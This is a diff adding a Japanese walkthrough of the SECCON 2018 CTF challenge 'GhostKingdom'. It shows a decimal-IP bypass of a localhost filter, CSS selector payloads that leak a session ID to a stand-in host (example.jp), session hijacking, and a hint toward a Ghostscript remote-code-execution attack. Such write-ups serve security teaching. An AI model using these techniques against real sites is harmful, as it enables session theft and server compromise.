@@ -1,0 +1,70 @@
+===========================================================================
+★ GhostKingdom for SECCON 2018 ONLINE  by KeigoYAMAZAKI, 2018.08.31-
+===========================================================================
+
+概要: CSSインジェクション ＋ GhostMagickの任意のコード実行
+
+
+1. 問題文にある http://ghostkingdom.pwn.seccon.jp/FLAG/ にアクセス
+
+2. フラグのありかが分かるが、ファイル名が分からないためフラグは見れない
+
+3. /FLAG/ には、トップへのリンクがあるので、リンクをクリック
+
+4. ログインと、新規会員登録の画面が表示される
+
+5. 新規会員登録をおこなう
+
+6. 登録した会員でログインをおこなう
+
+7. ログイン後メニューに以下の3つが存在。3番目についてはローカルからのみ使えることが分かる
+　・Message to admin
+　・Take a screenshot
+　・Upload image  * Only for users logged in from the local network
+
+8. Message to admin をクリック
+
+9. Type: Emergency を選択した時に、Base64化されたスタイルシートの送信を確認。
+　CSSインジェクションが可能であることが分かる。
+　また、hiddenパラメータ「csrf」にセッションIDが出力されていることが分かる
+
+10. Take a screenshot をクリック。URLそのままでボタンを押してスクリーンショット撮影を確認
+　※負荷軽減のため、30秒に1回しか撮影できないように制限。ごめん。
+
+11. 7のメッセージを受けて、http://localhost/ や http://127.0.0.1/ の撮影を試みると、
+　以下のエラーメッセージが表示される。
+　You can not use URLs that contain the following keywords: 127, ::1, local
+
+12. 例えば、http://2130706433/ などのテクニックで、127.0.0.1 からページにアクセス。
+　ログイン画面の「from internet」が「from localhost」に変化していることが分かる
+
+13. http://2130706433/?user=ymzkei5&pass=manager&action=login のようにログインさせる。
+　ログイン後メニューで、使えなかった3番目のメニューが表示されていることを確認
+
+14. 9のCSSインジェクションを通じて、localhostからログインさせたセッションIDを奪取
+
+　[参考] CSS Injection ++ - 既存手法の概観と対策 - Speaker Deck
+　https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce
+
+　input[valuei^="a"]{background:url(http://example.jp/?sid=a)}
+　input[valuei^="b"]{background:url(http://example.jp/?sid=b)}
+　...
+
+　input[valuei^="aa"]{background:url(http://example.jp/?sid=aa)}
+　input[valuei^="ab"]{background:url(http://example.jp/?sid=ab)}
+　...
+
+　input[valuei^="aba"]{background:url(http://example.jp/?sid=aba)}
+　input[valuei^="abb"]{background:url(http://example.jp/?sid=abb)}
+　...
+
+15. セッションIDを自分のブラウザにセットして、メニューにアクセス
+
+16. 使えるようになった、Upload image をクリック
+
+17. 1MB未満のJpegをアップロードして表示、さらにGIFに変換する機能があることが分かる。
+　機能の内容と、/ghostMagick.cgi?action=convert という名前から、GhostScriptのRCEを
+　攻撃すれば良さそうなことが分かる
+
+18. RCEを通じて、/var/www/html/FLAG/ の中のフラグファイルを表示する
+
